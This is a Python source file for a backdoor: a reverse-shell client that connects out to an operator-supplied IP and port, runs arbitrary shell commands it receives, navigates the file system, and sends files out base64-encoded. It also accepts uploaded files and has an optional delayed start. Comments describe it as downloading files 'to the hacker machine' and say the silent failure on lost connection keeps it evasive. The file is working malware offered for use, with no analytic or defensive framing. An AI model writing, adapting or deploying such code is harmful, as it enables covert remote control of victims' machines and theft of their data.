#!/usr/bin/env python
import shutil
import socket, json
import subprocess
import os
import base64
import sys
import time



class Bckdoor:
    def __init__(self, ip, port):
        #self.configtime(1)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # JSON is used to make sure that the data transferred between the machines is not lost or broken in transmission       
    def send_integrity(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def receive_integrity(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # function for executing sent commands from handler
    def exec_sys_com(self, cmd):
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # allows for the navigation of the file system
    def move_wd(self, path):
        os.chdir(path)
        return "Changing working directory to " + path

    # function used to download files to the hacker machine
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # function used to upload files from the hacker machine
    def write_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "Upload successful!"

    def configtime(self, x):
        # Redundant code but can be used to delay the start of the backdoor
        while x < 120:
            time.sleep(1)
            x += 1

    def run(self):
        # Defines the backdoors ability to interpret commands from handler
        while True:
            cmd = self.receive_integrity()
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    exit()
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.move_wd(cmd[1])
                elif cmd[0] == "download":
                    cmd_result = self.read_file(cmd[1]).decode()
                elif cmd[0] == "upload":
                    cmd_result = self.write_file(cmd[1], cmd[2])
                else:
                    cmd_result = self.exec_sys_com(cmd).decode()
            except Exception:
                cmd_result = "[+] Command Error !!!"

            self.send_integrity(cmd_result)

# Enter your IP and port of choice, IP must be a string, port must be an integer
ip = 'Enter your LHOST here'
port = 8080

# IMPORTANT! This stops the program from displaying an error message if connection is lost. It maintains the backdoors evasiveness. 
try:
    the_bckdoor = Bckdoor(ip, port)
    the_bckdoor.run()
except Exception:
    sys.exit()









